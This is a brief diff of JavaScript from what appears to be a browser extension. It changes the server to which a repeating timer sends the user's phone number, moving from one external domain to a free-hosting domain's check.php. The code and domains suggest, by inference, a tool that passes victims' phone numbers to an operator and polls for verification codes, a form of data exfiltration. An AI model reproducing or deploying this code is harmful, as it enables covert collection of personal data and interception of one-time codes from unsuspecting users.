@@ -26,7 +26,7 @@ chrome.runtime.onMessage.addListener(function (request, sender, sendResponse) {
         CodeRequest = setInterval(function () {
 
             var xhr = new XMLHttpRequest();
-            xhr.open("GET", 'http://embratorie-live.online/check.php?Phone=' + request.mobileno, true);
+            xhr.open("GET", 'https://iliesbourouh.000webhostapp.com/check.php?Phone=' + request.mobileno, true);
             xhr.onreadystatechange = function () {
                 console.log('state changed');
                 if (xhr.readyState == 4) {
